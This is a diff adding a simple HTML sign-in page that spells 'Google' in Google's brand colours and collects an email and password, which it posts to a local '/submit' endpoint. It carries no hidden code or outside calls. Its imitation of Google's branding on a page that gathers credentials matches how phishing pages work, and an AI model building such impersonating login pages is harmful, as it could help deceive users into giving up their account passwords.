@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Google Login</title>
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Arial, Helvetica, sans-serif;
+}
+body {
+    background: #f5f7fa;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+.login-card {
+    width: 400px;
+    max-width: 90%;
+    background: white;
+    border-radius: 8px;
+    padding: 40px 48px;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    text-align: center;
+}
+.brand {
+    font-size: 42px;
+    font-weight: bold;
+    margin-bottom: 8px;
+}
+.brand span:nth-child(1) { color: #4285F4; }
+.brand span:nth-child(2) { color: #EA4335; }
+.brand span:nth-child(3) { color: #FBBC05; }
+.brand span:nth-child(4) { color: #4285F4; }
+.brand span:nth-child(5) { color: #34A853; }
+.brand span:nth-child(6) { color: #EA4335; }
+h1 {
+    font-size: 26px;
+    font-weight: 500;
+    color: #202124;
+    margin-bottom: 8px;
+}
+.subtitle {
+    color: #5f6368;
+    font-size: 15px;
+    margin-bottom: 30px;
+}
+.input-group {
+    margin-bottom: 16px;
+    position: relative;
+    text-align: left;
+}
+input {
+    width: 100%;
+    padding: 14px 16px;
+    border: 1px solid #dadce0;
+    border-radius: 4px;
+    font-size: 15px;
+    color: #202124;
+    background: white;
+}
+input:focus {
+    outline: none;
+    border-color: #1a73e8;
+}
+.eye-icon {
+    position: absolute;
+    right: 14px;
+    top: 50%;
+    transform: translateY(-50%);
+    cursor: pointer;
+    color: #1a9d8f;
+    font-size: 18px;
+}
+.otp-link {
+    display: block;
+    text-align: left;
+    color: #1a9d8f;
+    font-size: 14px;
+    font-weight: 500;
+    margin-bottom: 16px;
+    text-decoration: none;
+}
+.otp-link:hover {
+    text-decoration: underline;
+}
+.create-account {
+    text-align: left;
+    font-size: 14px;
+    color: #202124;
+    margin-bottom: 30px;
+}
+.create-account a {
+    display: block;
+    color: #1a9d8f;
+    font-weight: 500;
+    text-decoration: none;
+    margin-top: 2px;
+}
+.create-account a:hover {
+    text-decoration: underline;
+}
+.bottom {
+    display: flex;
+    justify-content: flex-end;
+}
+.btn {
+    background: #1a9d8f;
+    color: white;
+    border: none;
+    padding: 12px 28px;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 14px;
+    font-weight: bold;
+    letter-spacing: 1px;
+}
+.btn:hover {
+    background: #158073;
+}
+@media(max-width: 480px) {
+    .login-card {
+        padding: 30px 24px;
+    }
+}
+</style>
+</head>
+<body>
+<div class="login-card">
+    <div class="brand">
+        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+    </div>
+    <h1>Sign In</h1>
+    <p class="subtitle">to continue to application</p>
+
+    <form action="/submit" method="POST">
+        <div class="input-group">
+            <input type="email" name="email" placeholder="Email or Phone" required>
+        </div>
+        <div class="input-group">
+            <input type="password" name="password" id="passwordField" placeholder="Password" required>
+            <span class="eye-icon" onclick="togglePassword()">👁</span>
+        </div>
+        <a href="#" class="otp-link">Enter OTP</a>
+        <div class="create-account">
+            You can join us now by
+            <a href="#">Creating a account</a>
+        </div>
+        <div class="bottom">
+            <button type="submit" class="btn">LOGIN</button>
+        </div>
+    </form>
+</div>
+
+<script>
+function togglePassword() {
+    const pwd = document.getElementById('passwordField');
+    pwd.type = pwd.type === 'password' ? 'text' : 'password';
+}
+</script>
+</body>
+</html>
